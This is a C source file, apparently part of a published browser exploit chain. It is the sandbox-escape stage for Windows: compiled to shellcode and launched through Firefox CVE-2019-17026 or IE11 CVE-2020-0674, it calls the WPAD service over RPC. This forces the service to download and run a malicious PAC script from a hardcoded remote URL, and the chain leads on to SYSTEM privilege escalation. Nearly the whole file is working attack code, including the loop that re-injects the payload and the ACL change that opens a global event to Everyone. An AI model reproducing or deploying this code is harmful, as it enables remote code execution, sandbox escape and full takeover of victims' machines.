/*
________                 ___.    .__                 _________  __
\______ \    ____   __ __\_ |__  |  |    ____       /   _____/_/  |_ _____  _______
 |    |  \  /  _ \ |  |  \| __ \ |  |  _/ __ \      \_____  \ \   __\\__  \ \_  __ \
 |    `   \(  <_> )|  |  /| \_\ \|  |__\  ___/      /        \ |  |   / __ \_|  | \/
/_______  / \____/ |____/ |___  /|____/ \___  >    /_______  / |__|  (____  /|__|
        \/                    \/            \/             \/             \/
Windows 7/8.1 IE/Firefox RCE -> Sandbox Escape -> SYSTEM EoP Exploit Chain

                        ______________
                        | Remote PAC | 
                        |____________|  
                               ^
                               | HTTPS
_______________   RPC   _______________   RPC   _______________
| firefox.exe | ------> | svchost.exe | ------> | spoolsv.exe |
|_____________|         |_____________| <------ |_____________|
                               |          Pipe
                               |
           _______________     | 
           | malware.exe | <---| Execute impersonating NT AUTHORY\SYSTEM
           |_____________|

~

Component

WPAD sandbox escape (stage two shellcode) - WPAD RPC client to inject malicious PAC
JS file into svchost.exe (LOCAL SERVICE).


_______________  JIT spray   ________________________  DEP bypass   _______________________
| firefox.exe | -----------> | Egg hunter shellcode | ------------> | WPAD sandbox escape |
|_____________|              |______________________|               | shellcode (heap)    |
                                                                    |_____________________|
~

Overview

This component of the chain will be compiled as a DLL and converted into a shellcode
prior to being encoded in JS and planted into one of the live Firefox or Internet
Explorer RCE. It is designed to initiate an RPC connection to the WPAD service within
svchost.exe (running as LOCAL SERVICE) via ALPC and simulate the functionality of
WINHTTP.DLL!WinHttpGetProxyForUrl (which is itself blocked by the OS). This results
in the WPAD service attempting to download a PAC file (a JS script) from a remote
URL of our choice and execute it in an attempt to update proxy configuration settings.

The PAC itself (on Windows 7 and 8.1) may force the legacy JS engine (jscript.dll)
to be loaded, and exploit it via memory corruption. In the latest version of Windows
10, WPAD has been thoroughly sandboxed: jscript.dll will no longer be loaded and
has been replaced with Chakra. Furthermore, the PAC file itself is now executed
within an extremely locked down child process called pacjsworker.exe which runs
as Low Integrity in conjunction with a slew of additional exploit mitigation systems
such as ACG and CIG. Despite this, access to the WPAD service (and the ability to
coerce it into downloading and running arbitrary JS in the form of PAC files) can
still be done even from most sandboxes (including Firefox and AppContainers) on
the latest Windows 10, thus making WPAD a persistent potential vector for both
sandbox escape and privilege escalation in the future.

When executed via Firefox CVE-2019-17026, this is the second shellcode to be run
as part of this chain and will be found on the heap by the JIT sprayed egg hunter
shellcode, set to +RWX and then executed via a CALL instruction.

When executed via Internet Explorer 11 Enhanced Protected Mode CVE-2020-0674 this
will be the first stage/initial shellcode to be executed, and will result in 
repeated continuous RPC calls to WPAD resulting in multiple payload execution.
This is due to IE11 running as Low Integrity being unable to create the global
event object needed to synchronize this shellcode with the Spool Potato shellcode.

It should also be noted that this code is designed to be run on Windows 8.1 or 10:
the WPAD RPC interface has changed between Windows 7 and 8.1 and the interface
information hardcoded into this client is for 8.1+. Before attempting to use this
client on Windows 7, the IDL file and all relevant interface information for WPAD
must be updated and re-compiled.

~

Design

Of significant note is that throughout my own testing, WPAD has only sporadically
been successful in downloading/running PAC files via this technique: it typically
takes several attempts (several RPC calls via this code) before the desired
logic is executed. For this reason, it was necessary to synchronize this shellcode
with the stage three shellcode (the Spool Potato shellcde) running within WPAD
so that this client could be notified when its RPC call had resulted in shellcode
execution and stop repeatedly making its RPC call.

In order to share the event object between the sandboxed shellcode running as
a regular user account and LOCAL SERVICE, it was placed in the global object
namespace (\BaseNamedObjects) as opposed to the default local namespace in
\Sessions\1\BaseNamedObjects. The ACL for the event object is then modified
to allow access to LOCAL SERVICE, which by default will be unable to interact
with the object.

~

Credits

Hacksys team - they did the reverse engineering and wrote the original PoC
               for this technique.

*/

#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <AclAPI.h>

#include "IWinHttpAutoProxySvc_h.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "AdvAPI32.lib")

////////
////////
// Global settings
////////

//#define DEBUG
//#define EXE_BUILD
#define DLL_BUILD
#define SHELLCODE_BUILD
#define SPOOL_SYNC
#define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
#define SYNC_EVENT_NAME L"Global\\DoubleStar"

////////
////////
// Debug logic
////////

void DebugLog(const wchar_t* Format, ...) {
#ifdef DEBUG
    va_list Args;
    static wchar_t* pBuffer = NULL;

    if (pBuffer == NULL) {
        pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
    }
    else {
        ZeroMemory(pBuffer, 10000 * 2);
    }

    va_start(Args, Format);
    wvsprintfW(pBuffer, Format, Args);
    va_end(Args);
#ifdef DLL_BUILD
    MessageBoxW(NULL, pBuffer, L"WPAD escape", 0); // FF sandbox will block this at content level 5-3. 2 and lower works.
#endif
#ifdef EXE_BUILD
    printf("%ws\r\n", pBuffer);
#endif
    //HeapFree(GetProcessHeap(), 0, pBuffer);
#endif
}

////////
////////
// ACL manipulation logic
////////

BOOL SetObjectAclAllAccess(HANDLE hObject, wchar_t* SID, SE_OBJECT_TYPE ObjectType) {
    PACL pDacl = NULL, pNewDACL = NULL;
    EXPLICIT_ACCESSW ExplicitAccess = { 0 };
    PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
    PSID pSID = NULL;
    BOOL bSuccess = FALSE;
    uint32_t dwError;

    if ((dwError = GetSecurityInfo(hObject, ObjectType, DACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, NULL, &pSecurityDescriptor)) == ERROR_SUCCESS) {
        if (ConvertStringSidToSidW(SID, &pSID)) {
            ExplicitAccess.grfAccessMode = SET_ACCESS;
            ExplicitAccess.grfAccessPermissions = GENERIC_ALL;
            ExplicitAccess.grfInheritance = CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE;
            ExplicitAccess.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
            ExplicitAccess.Trustee.pMultipleTrustee = NULL;
            ExplicitAccess.Trustee.ptstrName = pSID;
            ExplicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
            ExplicitAccess.Trustee.TrusteeType = TRUSTEE_IS_UNKNOWN;

            if ((dwError = SetEntriesInAclW(1, &ExplicitAccess, pDacl, &pNewDACL)) == ERROR_SUCCESS) {
                if ((dwError = SetSecurityInfo(hObject, ObjectType, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL)) == ERROR_SUCCESS) {
                    bSuccess = TRUE;
                }

                LocalFree(pNewDACL);
            }
        }

        LocalFree(pSID);
    }

    return bSuccess;
}

////////
////////
// Primary WPAD RPC logic
////////

RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
    INT nReply = 0;
    uint32_t dwInt = 0;
    uint32_t dwWinHttpStatusCode = 0;
    RPC_WSTR StringBinding = NULL;
    RPC_STATUS RpcStatus = RPC_S_OK;
    RPC_BINDING_HANDLE hRpcBinding = NULL;
    HANDLE hNameResTrkRecord = NULL;
    uint32_t dwAutoConfigUrlLen = (wcslen(PacUrl) + 1) + 500;
    wchar_t* pAutoConfigUrl = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwAutoConfigUrlLen * 2);
    RPC_ASYNC_STATE RpcAsyncState = { 0 };
    tagProxyResolveUrl ProxyResolveUrl = { 0 };
    WINHTTP_PROXY_RESULT_EX ProxyResult = { 0 };
    WINHTTP_SESSION_OPTIONS SessionOptions = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions = { 0 };

    // Make a unique variation of the specified PAC URL to avoid WPAD cache issues

    _snwprintf_s(pAutoConfigUrl, dwAutoConfigUrlLen, dwAutoConfigUrlLen, L"%ws?%lld", PacUrl, __rdtsc());
    DebugLog(L"... target PAC URL: %ws", pAutoConfigUrl);

    // Create the configuration structs used in invoking the GetProxyForUrl method

    ProxyResolveUrl.Url = L"http://www.google.com/"; // This may vary, any URL will do since the PAC will not end up configuring a proxy for it anyway and it is the PAC execution itself which yields value
    ProxyResolveUrl.Domain = L"www.google.com";
    ProxyResolveUrl.Seperator = L"/";
    ProxyResolveUrl.Member4 = 0x3;   // Contant still UNKNOWN. Another valid value is 0x4
    ProxyResolveUrl.Member5 = 0x50;  // Contant still UNKNOWN. Another valid value is 0x1BB

    AutoProxyOptions.lpszAutoConfigUrl = pAutoConfigUrl;
    AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL | WINHTTP_AUTOPROXY_RUN_OUTPROCESS_ONLY;

    SessionOptions.dwMaxTimeout = 0xffffffff;
    SessionOptions.dwTimeout1 = 0x0000ea60; // seems like dwTimeout 60000 MS
    SessionOptions.Member2 = 0x00000005;    // maybe drift timeout
    SessionOptions.dwTimeout2 = 0x00007530;
    SessionOptions.dwTimeout3 = 0x00007530;
    SessionOptions.Member5 = 0x00000000;

    /* 
    The RPC call to WPAD follows a simple pattern:
       1. Create an RPC string binding handle on the ncalrpc protocol
       2. Generate an RPC_BINDING_HANDLE (to be used in all future operations) from the string binding handle
       3. Create an asynchronous RPC state handle which will be used for the actual call to GetProxyForUrl
       4. Make the RPC call to GetProxyForUrl within the WPAD service and wait for its completion via the event object in its RPC async handle
    */

    RpcStatus = RpcStringBindingComposeW(0, (RPC_WSTR)L"ncalrpc", 0, 0, 0, &StringBinding); // Create the initial RPC string binding handle over ncalrpc protocol

    if (RpcStatus == RPC_S_OK) {
        RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hRpcBinding); // Create the primary RPC binding handle

        if (RpcStatus == RPC_S_OK) {
            RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState)); // Initialize an asynchronous RPC state handle which will be used for the actual remote call GetProxyForUrl

            if (RpcStatus == RPC_S_OK) {
                RpcAsyncState.UserInfo = NULL;
                RpcAsyncState.NotificationType = RpcNotificationTypeEvent;
                RpcAsyncState.u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); // https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state

                RpcTryExcept {
                    DebugLog(L"... calling GetProxyForUrl RPC method.");

                    GetProxyForUrl(
                        &RpcAsyncState,
                        hRpcBinding,
                        &ProxyResolveUrl,
                        &AutoProxyOptions,
                        &SessionOptions,
                        0,
                        NULL,
                        &dwInt,
                        &ProxyResult,
                        &hNameResTrkRecord,
                        &dwWinHttpStatusCode
                    );
                }
                RpcExcept(1) {
                    DebugLog(L"... GetProxyForUrl failed. Error: 0x%x", RpcExceptionCode());
                }
                RpcEndExcept

                uint32_t dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000);
                
                if (RpcAsyncState.u.hEvent != NULL) { // Unclear why this would occur, perhaps the RPC server or OS may closed it autonomously?
                    CloseHandle(RpcAsyncState.u.hEvent);
                }
                
                if (dwWaitResult == WAIT_OBJECT_0) {
                    //RpcAsyncCompleteCall(&RpcAsyncState, &nReply); // This may crash with exception RPC_S_INTERNAL_ERROR in some cases. When repetition is needed it wrecks the exploit chain.
                }
                else {
                    DebugLog(L"... RPC call to WPAD GetProxyForUrl async event wait failed (error 0x%08x)\r\n", dwWaitResult);
                    RpcAsyncCancelCall(&RpcAsyncState, TRUE);
                }
            }
            else {
                DebugLog(L"... RpcAsyncInitializeHandle failed. Error: 0x%x", RpcStatus);
            }

            RpcBindingFree(&hRpcBinding);
        }
        else {
            DebugLog(L"... RpcBindingFromStringBindingW failed. Error: 0x%x", RpcStatus);
        }

        RpcStringFreeW(&StringBinding);
    }
    else {
        DebugLog(L"... RpcStringBindingCompose failed. Error: 0x%x", RpcStatus);
    }

    HeapFree(GetProcessHeap(), 0, pAutoConfigUrl);

    return RpcStatus;
}

void WpadSpoolSync(const wchar_t* PacUrl) {
    HANDLE hEvent = NULL;

    /*
    SpoolPotato/WPAD client synchronization

    Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
    the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
    often yield a successful status from WPAD.

    To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
    attempt to trigger the PAC download until it receives confirmation via an event object from within
    the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
    the CVE-2020-0674 UAF.

    The WPAD client initially:
    1. Creates a sync event object in \BaseNamedObjects and then proceeds to repeatedly make RPC calls to
       WPAD in a loop.
    2. Between each iteration of the loop it spends several seconds waiting for the signal event it
       previously created to be signalled by SpoolPotato.
    3. Once the event has been triggered the WPAD client ends its loop and terminates.

    Meanwhile the SpoolPotato shellcode:
    1. Signals the event object to signal completion to the WPAD client.
    2. Makes its privilege escalation operations.
    */

    if ((hEvent = CreateEventW(NULL, TRUE, FALSE, SYNC_EVENT_NAME)) != NULL) { // Creating event globally bypasses FF sandbox but will not work with IE11 64-bit (Protected Mode) running as Low Integrity. Event will be created to \BaseNamedObjects rather than current session namespace.
        if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
            DebugLog(L"... successfully set Everyone ACL on event object");
        }
        else {
            CloseHandle(hEvent);
            DebugLog(L"... failed to set Everyone ACL on global event object");
        }
    }
    else {
        DebugLog(L"... failed to create sync event");
    }

    while (TRUE) {
        DebugLog(L"... sending PAC update RPC signal to WPAD for %ws...", PacUrl);
        RPC_STATUS RpcStatus = WpadInjectPac(PacUrl);
        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x. Waiting on event signal...", RpcStatus);

        if (hEvent != NULL) {
            if (WaitForSingleObject(hEvent, 250) == WAIT_OBJECT_0) { // Note that when the RPC call is successful it will hang waiting on the async call event, thus I don't need to be concerned about this loop sending multiple PAC to WPAD and messing up the UAF or launching multiple payloads
                DebugLog(L"... received sync signal from code within WPAD");
                break;
            }
            else {
                DebugLog(L"... timed out waiting on sync signal from code within WPAD");
            }
        }
        else {
            DebugLog(L"... sleeping due to event creation failure (infinite RPC loop)");
            Sleep(250);
        }
    }
}

#ifdef DLL_BUILD
BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
#ifdef SHELLCODE_BUILD
#ifdef SPOOL_SYNC
    WpadSpoolSync(TARGET_PAC_URL);
#else
    WpadInjectPac(TARGET_PAC_URL);
#endif
#else
    switch (dwReason) {
        case DLL_PROCESS_ATTACH: 
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WpadInjectPac, (PVOID)TARGET_PAC_URL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
#endif
    return TRUE;
}
#else
int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
    if (nArgc < 2) {
        DebugLog(L"... no PAC URL argument provided");
    }
    else {
#ifdef SPOOL_SYNC
        WpadSpoolSync(pArgv[1]);
#else
        WpadInjectPac(pArgv[1]);
#endif
    }

    system("pause");

    return 0;
}
#endif